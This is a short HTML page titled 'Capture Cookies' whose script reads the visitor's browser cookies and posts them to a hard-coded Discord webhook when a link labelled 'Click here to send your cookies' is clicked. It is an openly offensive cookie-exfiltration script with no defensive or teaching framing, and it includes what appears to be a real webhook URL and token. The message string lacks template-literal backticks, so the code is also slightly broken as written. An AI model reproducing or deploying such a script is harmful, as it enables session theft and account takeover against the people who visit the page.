<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Cookies</title>
    <script>
        function sendCookiesToDiscord() {
            const cookies = document.cookie;
            const webhookURL = "https://discordapp.com/api/webhooks/1286807971124351089/ZfIfOYcLNghelccJx4KWPsOhtoItGmUJhFLfz8RE26FHDYLpiuB8lbtTZz5pmw3-AzMQ"; // Replace with your webhook URL

            const payload = { content: User's cookies: ${cookies} };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            })
            .then(response => response.text())
            .then(data => {
                console.log('Cookies sent to Discord:', data);
                alert('Cookies sent successfully!');
            })
            .catch(error => {
                console.error('Error sending cookies:', error);
            });
        }
    </script>
</head>
<body>
    <a href="#" onclick="sendCookiesToDiscord(); return false;">Click here to send your cookies</a>
</body>
</html>
